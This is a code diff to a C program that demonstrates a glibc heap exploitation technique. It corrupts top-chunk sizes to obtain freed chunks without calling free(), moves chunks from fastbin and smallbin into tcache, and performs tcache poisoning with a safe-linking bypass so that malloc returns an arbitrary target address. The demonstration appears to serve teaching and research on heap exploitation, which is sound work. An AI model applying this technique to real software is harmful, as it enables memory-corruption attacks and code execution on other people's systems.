@@ -140,18 +140,27 @@ int main() {
 
   assert(freed_top_size == CHUNK_SIZE_1);
 
+  // free the previous top_chunk
+  heap_ptr = malloc(SIZE_3);
+
   // this will be our vuln_tcache for tcache poisoning
   vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
 
   printf("tcache next ptr: 0x%lx\n", vuln_tcache);
 
-  // free the previous top_chunk
-  heap_ptr = malloc(SIZE_3);
+  // do the above again to free one more chunk so that we can moves chunks from smallbin to tcache
+  printf("repeat the above process and obtain one more free chunk\n");
+  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
+  new_top_size = top_size & PAGE_MASK;
+  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
+  heap_ptr = malloc(SIZE_3); // do the free
+  printf("At this point, the latest freed chunk will be in fastbin while the other two in smallbin.\n");
+  printf("We do one more large allocation malloc(0x10000) to move the chunk from fastbin to smallbin, so 3 chunks in smallbin\n");
+  void *pad1 = malloc(0x10000); // a huge allocation that moves the fastbin to smallbin
+  printf("Now, we allocate one chunks from the smallbin, this will move the other two chunks into tcache.\n");
+  void *pad2 = malloc(SIZE_1); // allocate from the smallbin to move things into tcache
 
-  // in glibc-2.42, the freed chunk will be directly added into fastbin, which is not
-  // as good as in tcachebin, let's force it to be in tcache by taking it out and free it
-  free(malloc(SIZE_1));
-
+  printf("Finally, we can do tcache poisoning.\n");
   // corrupt next ptr into pointing to target
   // use a heap leak to bypass safe linking (GLIBC >= 2.32)
   heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);
@@ -164,5 +173,5 @@ int main() {
 
   // proof that heap_ptr now points to the same string as target
   assert((size_t) heap_ptr == target);
-  puts((char *) heap_ptr);
+  puts("Success! During the whole process, we didn't use the free() function.");
 }
